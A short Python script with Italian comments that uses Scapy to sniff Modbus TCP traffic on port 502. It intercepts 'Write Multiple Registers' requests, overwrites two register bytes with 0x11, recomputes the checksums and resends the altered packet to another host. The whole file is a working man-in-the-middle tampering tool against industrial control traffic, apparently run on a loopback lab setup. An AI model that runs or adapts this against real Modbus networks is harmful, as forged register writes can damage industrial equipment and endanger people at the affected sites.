from scapy.all import *
from scapy.layers.inet import IP, TCP
import os

MODBUS_TCP_PORT = 502  # Porta Modbus standard

def intercept_modify(packet):
    """
    Intercetta i pacchetti TCP Modbus tra A e B.
    Modifica il pacchetto e lo invia a B invece che al server originale.
    """
    # Controlla se il pacchetto è TCP e se è destinato alla porta Modbus
    if packet.haslayer(TCP) and packet[TCP].dport == MODBUS_TCP_PORT:
        if Raw in packet:  # Se il pacchetto contiene un payload
            modbus_payload = bytearray(packet[Raw].load)
            
            # Se il codice di funzione è 16 (Write Multiple Registers)
            if modbus_payload[7] == 16:
                print("Pacchetto Modbus TCP intercettato!")
                print("Pacchetto originale:", modbus_payload)
                
                # Modifica il pacchetto (esempio: cambiare alcuni valori)
                modbus_payload[15] = 0x11  # Modifica il byte 15
                modbus_payload[16] = 0x11  # Modifica il byte 16
                
                print("Pacchetto modificato:", modbus_payload)
                
                # Riassegna il payload modificato al pacchetto
                packet[Raw].load = bytes(modbus_payload)
                
                # Ricalcola il checksum TCP
                del packet[TCP].chksum
                
                # Se hai modificato l'IP, ricalcola il checksum IP
                del packet[IP].chksum
                
                # Modifica l'indirizzo di destinazione: A invia il pacchetto a B
                packet[IP].dst = "localhost"  # Indirizzo IP di B (sostituisci con l'IP di B)
                
                # Invia il pacchetto modificato a B (sostituisci "lo0" con la tua interfaccia di rete)
                sendp(packet, iface="Software Loopback Interface 1", verbose=True)
                print("Pacchetto modificato inviato a B!")

            else:
                print("Pacchetto Modbus TCP non modificato.")

if __name__ == "__main__":
    sniff(iface="Software Loopback Interface 1", prn=intercept_modify, filter="tcp port 502", count=10)
